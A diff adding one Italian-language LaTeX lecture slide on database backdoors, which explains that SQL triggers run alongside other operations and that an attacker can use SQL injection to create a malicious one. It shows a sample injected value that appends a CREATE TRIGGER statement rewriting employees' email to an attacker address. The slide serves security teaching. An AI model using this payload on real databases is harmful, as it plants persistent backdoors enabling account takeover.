@@ -1,0 +1,15 @@
+\frametitle {Database Backdoors}
+  I database permettono la creazione di {\it triggers}: {\it stored procedures} da eseguire contestualmente all'esecuzione di altre operazioni.
+  \pause
+  \medskip
+  \newline
+  Un attaccante pu\`o sfruttare una vulnerabilit\`a SQL Injection per creare un trigger malizioso!
+  \begin{codice}
+    \begin{semiverbatim}
+      101; CREATE TRIGGER myBackDoor
+           BEFORE INSERT ON employee
+           FOR EACH ROW BEGIN UPDATE employee
+           SET email='john@hackme.com'
+           WHERE userid = NEW.userid
+    \end{semiverbatim}
+  \end{codice}
